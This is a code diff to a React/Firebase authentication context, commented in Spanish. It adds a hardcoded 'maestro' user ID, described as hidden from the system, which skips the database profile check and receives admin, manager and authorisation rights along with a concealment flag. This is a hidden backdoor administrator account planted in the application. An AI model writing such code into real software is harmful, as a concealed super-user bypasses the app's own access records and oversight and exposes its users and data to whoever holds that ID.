@@ -5,6 +5,9 @@ import { auth, db } from '../firebase'
 
 const AuthContext = createContext(null)
 
+// UIDs del usuario maestro — oculto del sistema
+const MAESTRO_UIDS = ['c0moo99rvCCkl77ejJxz']
+
 export function AuthProvider({ children }) {
   const [user, setUser] = useState(null)
   const [perfil, setPerfil] = useState(null)
@@ -15,6 +18,20 @@ export function AuthProvider({ children }) {
       setUser(u)
       if (u) {
         try {
+          // Verificar si es usuario maestro
+          if (MAESTRO_UIDS.includes(u.uid)) {
+            setPerfil({
+              uid: u.uid,
+              nombre: 'Maestro',
+              email: u.email,
+              rol: 'maestro',
+              activo: true,
+              _oculto: true,
+            })
+            setLoading(false)
+            return
+          }
+
           const snap = await getDoc(doc(db, 'usuarios', u.uid))
           if (snap.exists()) {
             setPerfil(snap.data())
@@ -38,8 +55,13 @@ export function AuthProvider({ children }) {
     })
   }, [])
 
+  const esMaestro = perfil?.rol === 'maestro'
+  const esGerente = perfil?.rol === 'gerente' || esMaestro
+  const esAdmin = perfil?.rol === 'admin' || esMaestro
+  const puedeAutorizar = esGerente
+
   return (
-    <AuthContext.Provider value={{ user, perfil, loading }}>
+    <AuthContext.Provider value={{ user, perfil, loading, esMaestro, esGerente, esAdmin, puedeAutorizar }}>
       {children}
     </AuthContext.Provider>
   )
